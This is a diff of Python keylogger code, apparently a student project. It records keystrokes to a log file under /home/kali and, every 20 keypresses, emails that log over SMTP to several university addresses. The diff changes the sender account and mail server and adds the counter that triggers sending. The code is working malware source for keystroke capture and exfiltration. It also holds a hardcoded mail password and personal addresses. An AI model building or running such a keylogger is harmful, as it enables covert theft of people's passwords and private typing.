@@ -11,11 +11,11 @@ def mail_it():
 
 	import os
 
-	mail = "alimehdibadamiexample791@outlook.com"
+	mail = "alimehdibadamiexample791@gmail.com"
 	password = "alibadami0791"
 	# can also implement other arguments [target2@mail.com,target1@mail.com]
 
-	destination_mail = ["k213610@nu.edu.pk" , "k214755@nu.edu.pk","k214754@nu.edu.pk"]
+	destination_mail = ["k213610@nu.edu.pk" , "k214755@nu.edu.pk","k214771@nu.edu.pk"]
 	path = "/home/kali/Documents/keyslogging.txt"
 
 	#creating message
@@ -32,7 +32,7 @@ def mail_it():
 
 
 	#initializing smpt connection and sending mail
-	server = smtplib.SMTP("smtp.outlook.com", 587) 
+	server = smtplib.SMTP("smtp.yahoo.com", 587) 
 	server.starttls()
 	server.ehlo()
 	server.login(mail,password)
@@ -45,6 +45,8 @@ def mail_it():
 def on_press(key):
 	write_1(key)
 	
+	global counter
+	counter +=1
 	if counter%20 ==0:
 		mail_it()
 
